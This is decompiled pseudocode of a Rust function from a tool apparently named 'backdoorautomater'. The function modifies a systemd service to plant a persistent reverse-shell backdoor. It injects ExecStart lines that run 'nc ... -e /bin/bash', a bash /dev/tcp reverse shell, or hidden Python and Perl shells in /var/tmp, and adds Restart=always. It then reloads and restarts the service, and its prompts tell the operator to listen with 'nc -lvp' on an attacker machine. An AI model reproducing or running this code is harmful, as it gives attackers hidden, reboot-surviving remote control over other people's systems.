fn backdoorautomater::modifyservice::modify_service(a0: &struct24, a1: &struct24, a2: &str, a3: &struct24, a4: &struct24) {
    let v0: u32;  // [bp-0x4a8]
    let v1: struct16;  // [bp-0x380], Other Possible Types: void*, u64
    let v2: u64;  // [bp-0x380]
    let v3: void*;  // [sp-0x378], Other Possible Types: u64
    let v4: u32;  // [sp-0x36c]
    let v5: struct16;  // [sp-0x368], Other Possible Types: alloc::borrow::Cow<str>, core::result::Result<std::process::Output, std::io::error::Error>, struct24, alloc::vec::Vec<u8, alloc::alloc::Global>
    let v6: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x368], Other Possible Types: u64
    let v7: alloc::string::String;  // [bp-0x368], Other Possible Types: u128
    let v8: u64;  // [bp-0x358]
    let v9: struct24;  // [sp-0x328], Other Possible Types: struct56
    let v10: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x328], Other Possible Types: u128
    let v11: struct24;  // [bp-0x328]
    let v12: struct56;  // [bp-0x328]
    let v13: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x328]
    let v14: u64;  // [sp-0x318]
    let v15: u128;  // [bp-0x308]
    let v16: void*;  // [bp-0x2e8], Other Possible Types: u128
    let v17: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x2e8], Other Possible Types: struct24
    let v18: u64;  // [bp-0x2e0]
    let v19: void*;  // [bp-0x2d8]
    let v21: u32;  // [bp-0x2c4]
    let v22: i64;  // [bp-0x2c0]
    let v23: i64;  // [bp-0x2b8]
    let v24: u64;  // [bp-0x2b0]
    let v25: struct24;  // [bp-0x2a8]
    let v26: std::io::stdio::Stdin;  // [bp-0x288], Other Possible Types: &str, (usize, std::backtrace_rs::symbolize::gimli::Mapping), struct149, alloc::string::String, struct24
    let v27: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x288], Other Possible Types: struct24
    let v28: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x288]
    let v29: struct24;  // [bp-0x288]
    let v30: &str;  // [bp-0x288], Other Possible Types: struct24
    let v31: struct24;  // [bp-0x288]
    let v32: &str;  // [bp-0x288]
    let v33: &str;  // [bp-0x288]
    let v34: struct24;  // [bp-0x288]
    let v35: void*;  // [bp-0x278], Other Possible Types: u128
    let v36: &str;  // [bp-0x278]
    let v37: u64;  // [bp-0x270]
    let v38: u64;  // [bp-0x270]
    let v39: i64;  // [bp-0x1b0]
    let v40: u128;  // [bp-0x1a8]
    let v41: u128;  // [bp-0x198]
    let v42: u64;  // [bp-0x190]
    let v43: u64;  // [bp-0x188]
    let v44: void*;  // [bp-0x178], Other Possible Types: alloc::raw_vec::Cap, alloc::string::String
    let v45: u64;  // [bp-0x170]
    let v46: void*;  // [bp-0x168], Other Possible Types: u64
    let v47: u64;  // [bp-0x168]
    let v48: void*;  // [bp-0x158]
    let v49: u128;  // [bp-0x158]
    let v50: u64;  // [bp-0x150]
    let v51: void*;  // [bp-0x148], Other Possible Types: u64
    let v52: i64;  // [bp-0x140]
    let v53: u32;  // [bp-0x134]
    let v54: i64;  // [bp-0x130]
    let v55: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x128]
    let v56: u128;  // [bp-0x128]
    let v57: u64;  // [bp-0x118]
    let v58: u128;  // [bp-0x108]
    let v59: u64;  // [bp-0xf8]
    let v60: u128;  // [bp-0xe8]
    let v61: u64;  // [bp-0xd8]
    let v62: alloc::string::String;  // [bp-0xb0]
    let v63: u128;  // [bp-0xa8]
    let v64: &str;  // [bp-0x98]
    let v65: struct24;  // [bp-0x88]
    let v66: (usize, std::backtrace_rs::symbolize::gimli::Mapping);  // [bp-0x68]
    let v67: struct24;  // [bp-0x48]
    let v69: u32;  // edx
    let v70: u64;  // r14
    let v71: u64;  // rbp
    let v72: i64;  // rcx
    let v73: i64;  // rdx
    let v74: i64;  // rax
    let v75: u32;  // r12d
    let v76: u64;  // rbx
    let v81: u64;  // rax
    let v82: u32;  // r12d
    let v83: u64;  // rax
    let v85: u64;  // rax
    let v86: u64;  // rbx
    let v88: u64;  // rbx
    let v89: i64;  // r13
    let v90: i64;  // rax
    let v91: u64;  // rbp
    let v92: u64;  // rbx
    let v97: u128;  // xmm1
    let v99: void*;  // rsi
    let v102: u128;  // xmm1
    let v104: core::slice::iter::Iter<std::backtrace::BacktraceSymbol>;  // rax:rdx
    let v105: core::slice::iter::Iter<std::backtrace::BacktraceSymbol>;  // rax:rdx
    let v106: core::result::Result<usize, std::io::error::Error>;  // rax:rdx
    let v107: &str;  // rax:rdx
    let v108: &str;  // rax:rdx

    v70 = v69;
    v16 = 0;
    v18 = 1;
    v19 = 0;
    v1 = <alloc::string::String as core::clone::Clone>::clone(a4) & -0x100 | 1;
    v34 = <T as alloc::slice::hack::ConvertVec>::to_vec("ExecStartPre=/bin/sleep 15");
    v57 = v35;
    v56 = *(&v34.field_0 as &i128);
    v71 = vvar_190{reg 56} & -0x100 | 1;
    v1 = struct16 {
        field_0: v57 & -0x100 | 1
        field_8: v2 & -0x100 | 1
    };
    v105 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v72);
    v39 = v105.end_or_len;
    v74 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v105.ptr.pointer);
    v75 = v70;
    if v74 {
        while (!<&str as core::str::pattern::Pattern>::is_contained_in(*((v74 + 8) as &i64), *((v74 + 16) as &i64), v73, v72)) {
            v74 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v105.ptr.pointer);
            v76 += 1;
            if !v74 {
                goto LABEL_453e65;
            }
        }
        v74 = v75 - 1;
        match (v74 as u32) {
            0 => {
                v26 = "ExecStartPost=nc ";
                v35 = *((a3 + 8) as &i128);
                v1 = &g_565701;
                v3 = &g_565701;
                v71 = v71 & -0x100 | 1;
                v5 = alloc::str::join_generic_copy(&v26 as u64, 2, 1, 0);
                v10 = v6;
                alloc::vec::Vec<T,A>::extend_from_slice(&v10, " ");
                alloc::vec::Vec<T,A>::extend_from_slice(&v10, *((a4 + 8) as &i64), *((a4 + 16) as &i64));
                alloc::vec::Vec<T,A>::extend_from_slice(&v10, " -e /bin/bash");
                v26 = <alloc::string::String as core::clone::Clone>::clone(&v10);
                v19 = v35;
                v16 = *(&v26.vec.buf.cap as &i128);
                v1 = v19 & -0x100 | 1;
                v3 = v1 & -0x100 | 1;
                v3 = core::ptr::drop_in_place<alloc::string::String>(&v10) & -0x100 | 1;
                v4 = 0;
                goto LABEL_453e9a;
            }
            1 => {
                v26 = "ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/";
                v35 = *((a3 + 8) as &i128);
                v1 = &g_565701;
                v3 = &g_565701;
                v71 = v71 & -0x100 | 1;
                v5 = alloc::str::join_generic_copy(&v26 as u64, 2, 1, 0);
                v10 = v6;
                alloc::vec::Vec<T,A>::extend_from_slice(&v10, "/");
                alloc::vec::Vec<T,A>::extend_from_slice(&v10, *((a4 + 8) as &i64), *((a4 + 16) as &i64));
                alloc::vec::Vec<T,A>::extend_from_slice(&v10, " 0>&1'&\n");
                v26 = v13;
                alloc::vec::Vec<T,A>::insert(v72, v76, &v26);
                v26 = <T as alloc::slice::hack::ConvertVec>::to_vec("Restart=always\n");
                v65 = v27;
                v81 = alloc::vec::Vec<T,A>::insert(v72, v76, &v65) & -0x100 | 1;
                v3 = v81;
                v4 = 0;
                goto LABEL_4546a5;
            }
            2 => {
                v5 = struct24 {
                    field_0: *(v23 as &i128)
                    field_16: *((v23 + 16) as &i64)
                };
                v26 = struct24 {
                    field_0: *(v22 as &i128)
                    field_16: *((v22 + 16) as &i64)
                };
                v3 = 0;
                v1 = 1;
                v71 = v71 & -0x100 | 1;
                v3 = 0;
                v1 = 1;
                backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::modifyservice::write_shell_pyfile(&v5, &v26));
                v33 = "ExecStartPost=";
                v36 = "python /var/tmp/.shell.py";
                v3 = 0;
                v1 = 1;
                v5 = alloc::str::join_generic_copy(&v33 as u64, 2, 1, 0);
                v10 = v6;
                alloc::vec::Vec<T,A>::extend_from_slice(&v10, "\n");
                v26 = <alloc::string::String as core::clone::Clone>::clone(&v10);
                v19 = &g_56560d;
                v16 = *(&v26.vec.buf.cap as &i128);
                v3 = 0;
                v1 = 1;
            }
            3 => {
                v5 = struct24 {
                    field_0: *(v23 as &i128)
                    field_16: *((v23 + 16) as &i64)
                };
                v26 = struct24 {
                    field_0: *(v22 as &i128)
                    field_16: *((v22 + 16) as &i64)
                };
                v3 = 0;
                v1 = 1;
                v71 = v71 & -0x100 | 1;
                v3 = 0;
                v1 = 1;
                backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::modifyservice::write_shell_perl(&v5, &v26));
                v33 = "ExecStartPost=";
                v36 = "perl /var/tmp/.shell.pl";
                v3 = 0;
                v1 = 1;
                v5 = alloc::str::join_generic_copy(&v33 as u64, 2, 1, 0);
                v10 = v6;
                alloc::vec::Vec<T,A>::extend_from_slice(&v10, "\n");
                v26 = <alloc::string::String as core::clone::Clone>::clone(&v10);
                v19 = &g_565626;
                v16 = *(&v26.vec.buf.cap as &i128);
                v3 = 0;
                v1 = 1;
            }
        }
        goto LABEL_4546a5;
    }
LABEL_453e65:
    v81 = v74 & -0x100 | 1;
    v3 = v81;
    v4 = 0;
    if (v70 & 255) <= 4 {
        v0 = 26;
        v82 = 0;
        v1 = 1;
        if (*((&v0 + ((v75 & 31) >> 3)) as &i8) >> (v75 & 31 & 7) & 1) {
LABEL_453e9a:
            v26 = struct24 {
                field_0: *((v72 + 8) as &i64)
                field_8: *((v72 + 8) as &i64) + *((v72 + 16) as &i64) * 24
                field_16: 0
            };
            loop {
                v83 = <core::iter::adapters::enumerate::Enumerate<I> as core::iter::traits::iterator::Iterator>::next(&v26);
                if !v73 {
                    break;
                }
                v107 = core::str::<impl str>::trim_matches(*((v73 + 8) as &i64), *((v73 + 16) as &i64));
                if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v107.ptr, v107.len, "[Service]") {
                    break;
                }
            }
            v26 = struct24 {
                field_0: *((v72 + 8) as &i64)
                field_8: *((v72 + 8) as &i64) + *((v72 + 16) as &i64) * 24
                field_16: 0
            };
            loop {
                v85 = <core::iter::adapters::enumerate::Enumerate<I> as core::iter::traits::iterator::Iterator>::next(&v26);
                if !v73 {
                    break;
                }
                v86 = v85;
                v108 = core::str::<impl str>::trim_matches(*((v73 + 8) as &i64), *((v73 + 16) as &i64));
                if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v108.ptr, v108.len, "[Install]") && v73 {
                    if v86 > v83 {
                        v88 = v86 - 1;
                        v26 = v17;
                        v1 = 0;
                        alloc::vec::Vec<T,A>::insert(v24, v88, &v26);
                        v1 = 0;
                        v26 = <T as alloc::slice::hack::ConvertVec>::to_vec("Restart=always\n");
                        v66 = v27;
                        v71 = (v71 & -0x100 | 1) & -0x100 | 1;
                        v1 = 0;
                        alloc::vec::Vec<T,A>::insert(v24, v88, &v66);
                    } else {
                        v26 = v17;
                        v1 = 0;
                        alloc::vec::Vec<T,A>::push(v24, &v26);
                        v1 = 0;
                        v26 = <T as alloc::slice::hack::ConvertVec>::to_vec("Restart=always\n");
                        v67 = v27;
                        v71 = (v71 & -0x100 | 1) & -0x100 | 1;
                        v1 = 0;
                        alloc::vec::Vec<T,A>::push(v24, &v67);
                    }
                }
            }
        }
    }
LABEL_4546a5:
    v104 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v89);
    v5 = struct16 {
        field_0: v104.ptr.pointer
        field_8: v104.end_or_len
    };
    v90 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v5);
    v91 = (v71 & -0x100 | 1) & -0x100 | 1;
    if v90 {
        do {
            if <&str as core::str::pattern::Pattern>::is_contained_in(*((v90 + 8) as &i64), *((v90 + 16) as &i64), v73, v72) {
                v28 = v55;
                alloc::vec::Vec<T,A>::insert(v89, v92, &v28);
            }
            v90 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v5);
            v92 += 1;
        } while (v90);
    }
    v62 = <alloc::string::String as core::clone::Clone>::clone(a0);
    v5 = struct24 {
        field_0: *(v52 as &i128)
        field_16: *((v52 + 16) as &i64)
    };
    v26 = struct24 {
        field_0: *(v54 as &i128)
        field_16: *((v54 + 16) as &i64)
    };
    v21 = v91;
    backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::modifyservice::write_service(&v5, &v26, v89));
    v64 = "systemctl daemon-reload";
    v26 = std::process::Command::new("sh");
    v5 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v64 as u64));
    core::result::Result<T,E>::expect(&v105.ptr.pointer, &v5, "src/modifyservice.rs");
    v5 = alloc::string::String::from_utf8_lossy(v28.__0, v42);
    v29 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v5), v73);
    v25 = v30;
    backdoorautomater::sanitizer::sanitize_system_command(&v25);
    v30 = "systemctl stop ";
    v35 = v63;
    v5 = alloc::str::join_generic_copy(&v30 as u64, 2, 1, 0);
    v59 = v8;
    v58 = *(&v5.buf.cap as &i128);
    v26 = std::process::Command::new("sh");
    v5 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v58));
    v9 = core::result::Result<T,E>::expect(&v5, "src/modifyservice.rs");
    v43 = v9.field_48;
    v97 = v9.field_16;
    v41 = v15;
    v40 = v97;
    *(&v105.ptr.pointer as &u128) = v9.field_0;
    v5 = alloc::string::String::from_utf8_lossy(v41 as i64, v42);
    v31 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v5), v73);
    v14 = v35;
    v10 = *(&v31.field_0 as &i128);
    v25 = v11;
    backdoorautomater::sanitizer::sanitize_system_command(&v25);
    v32 = "systemctl start ";
    v35 = v63;
    v5 = alloc::str::join_generic_copy(&v32 as u64, 2, 1, 0);
    v53 = v82;
    v61 = v8;
    v60 = *(&v5.buf.cap as &i128);
    v44 = 0;
    v45 = 1;
    v46 = 0;
    v48 = 0;
    v50 = 1;
    v51 = 0;
    v99 = 0;
    loop {
        v46 = v46;
        if <[A] as core::slice::cmp::SlicePartialEq<B>>::equal(<alloc::string::String as core::ops::index::Index<I>>::index(1, v51), v73, "ok") {
            break;
        }
        println!("\x1b[31mAre you ready to get access with the backdoor ? \n");
        println!("On your 'Attacker machine' please put this nc command before to continue : nc -lvp {} \n", &v28 as u8);
        println!("When you are ready, please put 'ok' in lowercase");
        v26 = std::io::stdio::stdin();
        v106 = std::io::stdio::Stdin::read_line(&v26, &v44);
        core::result::Result<T,E>::expect(v106 as i64, *((&v106 as &char + 8) as &i64));
        v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(core::str::<impl str>::trim_end_matches(1, v46, 10), v73);
        v8 = v35;
        v7 = *(&v26.field_0 as &i128);
        v44 = v7;
        v26 = <alloc::string::String as core::clone::Clone>::clone(&v44);
        v51 = v35;
        v49 = *(&v26.vec.buf.cap as &i128);
        v44 = alloc::vec::Vec<T,A>::clear();
        v37 = v38;
        v6 = v7;
        v46 = v47;
    }
    println!("\nGreat ! Please wait 30 sec to have shell in your 'Attacker machine' terminal, and your backdoor will be installed correctly\x1b[0m\n");
    v26 = std::process::Command::new("sh");
    v5 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v26, "-c"), &v60));
    v12 = core::result::Result<T,E>::expect(&v5, "src/modifyservice.rs");
    v43 = v12.field_48;
    v102 = v12.field_16;
    v41 = v15;
    v40 = v102;
    *(&v105.ptr.pointer as &u128) = v12.field_0;
    v5 = alloc::string::String::from_utf8_lossy(v41 as i64, v42);
    v26 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v5), v73);
    v9 = struct24 {
        field_0: *(&v26.field_0 as &i128)
        field_16: 8
    };
    v25 = struct24 {
        field_0: *(&v9.field_0 as &i128)
        field_16: 8
    };
    backdoorautomater::sanitizer::sanitize_ex_stderr(&v25);
    println!("\x1b[36mBackdoor is installed and you have a reverse shell ! When the service will restart or the machine will reboot you will have a new reverse shell !\n");
    println!("But, don't forget to execute this command before: nc -lvp {}\n", &v28 as u8);
    println!("If you loose the reverse shell, don't worry ! Put again nc command on your attacker machine and wait\x1b[0m\n");
    return;
}
